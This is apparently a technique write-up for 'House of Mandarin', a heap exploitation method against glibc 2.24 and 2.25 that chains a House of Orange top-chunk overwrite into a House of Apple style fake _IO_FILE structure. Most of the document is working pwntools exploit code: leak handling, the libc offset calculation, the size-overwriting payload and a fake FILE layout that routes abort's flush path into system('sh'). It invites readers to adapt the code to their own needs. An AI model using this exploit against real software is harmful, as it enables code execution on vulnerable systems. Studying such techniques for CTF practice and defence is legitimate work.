# House Of Mandarin

Note: The exploit is tested for Glibc 2.24 and Glibc 2.25.

While studying House of Orange and House of Tangerine, I noticed an interesting gap between them. House of Orange applies before `_IO_FILE` vtable validation was introduced, so before glibc 2.24, while House of Tangerine depends on tcache, which appears in glibc 2.26 and later.

This leaves glibc 2.24 and 2.25 in a weird state. I couldn't find any public exploit that abuses the same primitives as those versions, so I made my own.

## Primitives

* Assume basic heap menu (create, free, show, edit)
* Overflow in edit
* Libc leak
* Heap leak

## Exploit

Get leaks. For simplicity, my binary just prints them:

```python
p.recvuntil(b'heap:')
heap_base = int(p.recvline(), 16)
p.recvuntil(b'libc:')
puts_leak = int(p.recvline(), 16)
libc.address = puts_leak - libc.symbols["puts"]
```

Calculate the head unsorted fd that points to the arena. Find the offset for each libc; I hardcoded the one for my libc:

```python
io_list_all = libc.symbols["_IO_list_all"]
unsorted_fd = io_list_all - 0x9a8
```

Then perform the House of Orange setup:

```python
create(0, 0x3f0, b'A') # allocate Chunk A
chunk0 = heap_base + 0x10 # binary dependant
top = chunk0 + 0x3f0 # adress of top

top_size = (0x1000 - (top & 0xfff)) | 1
edit(0, b'A' * 0x3f0 + p64(0) + p64(top_size)) # overwrite top.size // VULNERABILITY //

create(1, 0x1000, b'trigger') # trigger symalloc and send the top chunk into unsorted
```

Out of the House of Orange exploit we get `_IO_list_all -> main_arena_address.chain -> fake_file`. Here is where my idea comes in: what if we craft the fake file to do a House of Apple style exploit?

```python
IO_wfile_jump = libc.symbols['_IO_wfile_jumps']
fake_file = heap_base + 0x400
fake_lock = top + 0x180
system = libc.sym['system']

fake = bytearray(0x200)
fake[0x00:0x08] = b"  sh\x00\x00\x00\x00"
fake[0x08:0x10] = p64(0x61)
fake[0x10:0x18] = p64(unsorted_fd)
fake[0x18:0x20] = p64(io_list_all - 0x10)
fake[0x20:0x28] = p64(0) # _IO_write_base
fake[0x28:0x30] = p64(1) # _IO_write_ptr
fake[0x48:0x50] = p64(0)
fake[0x50:0x58] = p64(0) # wide_data + 0x30; must be 0 for doallocbuf
fake[0x68:0x70] = p64(0) # _chain
fake[0x88:0x90] = p64(fake_lock) # _lock
fake[0xa0:0xa8] = p64(fake_file + 0x20) # _wide_data (just pointer math for doallocbuf)
fake[0xd8:0xe0] = p64(IO_wfile_jump) # vtable
fake[0x150:0x158] = p64(fake_file + 0x100) # again pointer math
fake[0x168:0x170] = p64(system)

payload = b'A' * 0x3f0 + bytes(fake)
edit(0, payload)
```

Trigger the exploit by allocating another chunk. Because of the corrupted memory state, glibc will call `malloc_printerr -> __libc_message -> abort -> fflush -> _IO_flush_all_lockp`:

```python
create(2, 0x10, b'')
```

## Final note

This exploit is very permissive. You can easily change the FSOP logic or chain to adapt it to your own needs.
